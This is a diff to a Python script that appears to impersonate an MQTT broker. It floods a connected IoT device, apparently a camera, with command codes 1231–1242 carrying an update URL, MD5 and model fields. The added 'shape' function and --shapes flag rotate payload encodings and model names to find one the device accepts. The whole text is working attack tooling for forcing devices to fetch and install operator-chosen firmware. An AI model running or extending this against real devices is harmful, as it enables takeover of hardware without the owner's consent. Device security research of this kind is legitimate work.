@@ -105,6 +105,23 @@ def handle(conn, addr, args):
 
                 threading.Thread(target=delta, daemon=True).start()
 
+                def shape(c, a):
+                    inner = {"url": a.url, "md5": a.md5, "model": a.model, "sub_mac": a.sub_mac}
+                    base = {"cmd": c, "sub_mac": a.sub_mac, **inner}
+                    modes = ["plain", "data_obj", "data_str", "ver", "ctype", "cmdstr"]
+                    k = modes[(c - 1231) % len(modes)] if a.shapes else (a.wrap or "plain")
+                    if k == "data_obj":
+                        base["data"] = inner
+                    elif k == "data_str":
+                        base["data"] = json.dumps(inner)
+                    elif k == "ver":
+                        base["ver"] = "1"; base["encrypt_type"] = 1; base["data"] = inner
+                    elif k == "ctype":
+                        base["data"] = inner; base["encrypt_type"] = 1
+                    elif k == "cmdstr":
+                        base["cmd"] = str(c); base["data"] = inner
+                    return base
+
                 def blaster():
                     # let the device apply and report the delta before the trigger lands
                     time.sleep(args.delay)
@@ -115,14 +132,9 @@ def handle(conn, addr, args):
                     for i in range(args.repeat):
                         try:
                             c = cmds[i % len(cmds)]
-                            inner = {"url": args.url, "md5": args.md5, "model": args.model,
-                                     "sub_mac": args.sub_mac}
-                            body_obj = {"cmd": c, "sub_mac": args.sub_mac, **inner}
-                            if args.wrap == "str":
-                                body_obj["data"] = json.dumps(inner)
-                            elif args.wrap:
-                                body_obj["data"] = inner
-                            pl = json.dumps(body_obj).encode()
+                            if args.shapes:
+                                args.model = ["HL_CFL", "HL_CAM4"][(i // len(cmds)) % 2]
+                            pl = json.dumps(shape(c, args)).encode()
                             tb = topic.encode() if isinstance(topic, str) else topic
                             bo = struct.pack(">H", len(tb)) + tb + struct.pack(">H", 1) + pl
                             conn.sendall(packet(3, bo, flags=0x02))  # QoS1
@@ -181,6 +193,7 @@ def main():
     ap.add_argument("--interval", type=float, default=5.0)
     ap.add_argument("--delay", type=float, default=15.0)
     ap.add_argument("--cmd", type=int, default=0, help="0 = sweep 1231..1242")
+    ap.add_argument("--shapes", action="store_true")
     ap.add_argument("--wrap", nargs="?", const="obj", help="also nest the descriptor under data")
     a = ap.parse_args()
 
